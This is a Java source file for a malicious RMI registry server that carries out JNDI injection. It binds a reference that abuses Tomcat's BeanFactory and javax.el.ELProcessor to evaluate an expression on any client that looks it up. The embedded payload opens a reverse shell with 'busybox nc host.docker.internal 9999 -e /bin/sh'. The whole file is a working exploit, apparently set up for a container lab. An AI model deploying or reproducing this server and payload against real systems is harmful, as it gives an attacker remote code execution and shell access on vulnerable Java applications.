import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;
import com.sun.jndi.rmi.registry.ReferenceWrapper;


public class RmiServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

        try {
            Registry reg;
            try {
                reg = LocateRegistry.createRegistry(1099);
                System.out.println("java RMI registry created. port on 1099...");
            } catch (Exception e) {
                System.out.println("Using existing registry");
                reg = LocateRegistry.getRegistry();
            }
            /** Exploit with JNDI Reference with local factory Class **/
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,
                    "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "xx=eval"));
            ref.add(new StringRefAddr("xx",
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['busybox', 'nc', 'host.docker.internal', '9999', '-e', '/bin/sh']).start()\")"));
            ReferenceWrapper ServicesWrapper = new ReferenceWrapper(ref);
            reg.bind("Services", ServicesWrapper);

        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}